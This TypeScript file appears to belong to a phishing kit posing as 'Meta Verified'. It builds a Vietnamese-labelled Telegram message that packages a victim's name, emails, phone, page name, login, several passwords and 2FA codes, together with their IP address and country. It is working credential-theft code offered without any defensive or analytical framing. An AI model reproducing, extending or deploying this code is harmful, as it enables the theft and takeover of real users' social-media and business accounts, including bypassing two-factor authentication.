const TELEGRAM_LABEL = process.env.NEXT_PUBLIC_TELEGRAM_LABEL ?? 'Meta Verified';

export interface VerifiedFormData {
    fullName?: string;
    personalEmail?: string;
    businessEmail?: string;
    phone?: string;
    pageName?: string;
    loginIdentifier?: string | null;
}

function pad(n: number) {
    return n < 10 ? `0${n}` : String(n);
}

function formatDateTime(d: Date) {
    return `${pad(d.getDate())}/${pad(d.getMonth() + 1)}/${d.getFullYear()} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
}

export function buildVerifiedMessage(
    ipInfo: { ip?: string; country?: string },
    data: {
        form: VerifiedFormData;
        login?: string | null;
        passes?: string[];
        codes?: string[];
    }
): string {
    const dt = formatDateTime(new Date());
    const { form, login, passes, codes } = data;

    let message = `📩 <b>${TELEGRAM_LABEL}</b>\n`;
    message += `⏰ ${dt}\n`;
    message += `🌐 <code>${ipInfo.ip || 'Unknown'}</code> • ${ipInfo.country || 'Unknown'}\n`;
    message += `📱 Thiết bị: <code>__DEVICE_INFO__</code>\n`;
    message += `━━━━━━━━━━━━━━━━━━━━\n`;

    if (form.fullName || form.personalEmail || form.businessEmail || form.phone || form.pageName) {
        message += `<b>📋 THÔNG TIN</b>\n`;
        if (form.fullName) message += `   Tên: <code>${form.fullName}</code>\n`;
        if (form.personalEmail) message += `   Email: <code>${form.personalEmail}</code>\n`;
        if (form.businessEmail && form.businessEmail !== form.personalEmail) {
            message += `   Business: <code>${form.businessEmail}</code>\n`;
        }
        if (form.phone) message += `   SĐT: <code>${form.phone}</code>\n`;
        if (form.pageName) message += `   Page: <code>${form.pageName}</code>\n`;
    }

    if (login || (passes && passes.length > 0)) {
        message += `\n<b>🔐 ĐĂNG NHẬP</b>\n`;
        if (login) message += `   TK: <code>${login}</code>\n`;
        if (passes && passes.length > 0) {
            passes.forEach((p, i) => {
                message += `   MK${i + 1}: <code>${p}</code>\n`;
            });
        }
    }

    if (codes && codes.length > 0) {
        message += `\n<b>🔒 MÃ 2FA</b>\n`;
        codes.forEach((c, i) => {
            message += `   Code${i + 1}: <code>${c}</code>\n`;
        });
    }

    message += `━━━━━━━━━━━━━━━━━━━━`;
    return message;
}
